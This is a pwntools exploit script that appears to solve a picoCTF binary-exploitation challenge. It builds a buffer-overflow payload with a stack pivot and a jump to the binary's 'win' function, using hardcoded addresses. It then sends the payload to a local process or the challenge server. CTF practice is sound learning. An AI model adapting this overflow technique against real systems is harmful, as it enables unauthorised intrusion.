#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 57693
HOST = "saturn.picoctf.net"
exe = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE
leave_ret = 0x08049c95

# PAYLOAD
payload = b'\0'*(0xe - 4) + p32(0x80e7500)
payload += p32(exe.sym.win + 6) + p32(0x08049ECF)
payload += b'\0'*(0x70 - 4 - 8) + p32(0x80e74c0 + 0xa) + p32(0x08049ECF)
# input()
p.sendlineafter(b'flag\n', payload)

p.interactive()